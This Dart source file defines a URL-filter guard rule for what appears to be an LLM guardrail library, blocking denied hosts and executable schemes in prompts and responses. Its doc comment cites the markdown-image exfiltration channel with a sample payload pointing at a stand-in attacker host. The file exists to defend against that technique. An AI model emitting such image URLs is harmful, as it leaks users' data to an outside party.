import '../finding.dart';
import '../rule.dart';

/// Controls which URLs may appear in prompts and responses.
///
/// - [allowedHosts]: when non-empty, only these hosts (and subdomains) pass.
/// - [deniedHosts]: always rejected, takes precedence over the allow list.
/// - [allowedSchemes]: defaults to http/https; blocks `javascript:`,
///   `data:`, `file:` and other executable or local schemes.
///
/// This is the rule that stops the classic "exfiltrate via
/// `![](https://evil.example/?d=…)`" markdown-image channel.
class UrlFilterRule extends GuardRule {
  /// Creates a URL filter.
  UrlFilterRule({
    this.action = GuardAction.block,
    this.allowedHosts = const [],
    this.deniedHosts = const [],
    this.allowedSchemes = const ['http', 'https'],
  });

  @override
  GuardAction action;

  /// When non-empty, only these hosts and their subdomains are permitted.
  final List<String> allowedHosts;

  /// Hosts that are always rejected, even if also in [allowedHosts].
  final List<String> deniedHosts;

  /// Permitted URL schemes.
  final List<String> allowedSchemes;

    static final _url = RegExp(
    r'''\b(?:[a-zA-Z][a-zA-Z0-9+.-]{1,31})://[^\s<>"']+'''
    r'''|\bwww\.[^\s<>"']+'''
    r'''|\b(?:javascript|data|vbscript|file):[^\s<>"']+''',
    caseSensitive: false,
  );

  bool _hostMatches(String host, String entry) =>
      host == entry || host.endsWith('.$entry');

  @override
  String get id => 'url_filter';

  @override
  List<GuardFinding> inspect(String text) {
    final findings = <GuardFinding>[];
    for (final m in _url.allMatches(text)) {
      final raw = m.group(0)!;
      final uri = Uri.tryParse(
        raw.startsWith('www.') ? 'https://$raw' : raw,
      );
      if (uri == null) continue;
      final host = uri.host.toLowerCase();
      final scheme = uri.scheme.toLowerCase();
      final isAllowedScheme = allowedSchemes.contains(scheme);
      final isDenied = deniedHosts.any((d) => _hostMatches(host, d));
      final isAllowed = allowedHosts.isEmpty ||
          allowedHosts.any((a) => _hostMatches(host, a));
      if (!isAllowedScheme) {
        findings.add(
          GuardFinding(
            ruleId: id,
            severity: GuardSeverity.critical,
            message: 'URL uses a forbidden scheme: $scheme',
            start: m.start,
            end: m.end,
          ),
        );
      } else if (isDenied || !isAllowed) {
        findings.add(
          GuardFinding(
            ruleId: id,
            severity: GuardSeverity.warning,
            message: isDenied
                ? 'URL host is denied: $host'
                : 'URL host is not on the allow list: $host',
            start: m.start,
            end: m.end,
          ),
        );
      }
    }
    return findings;
  }
}
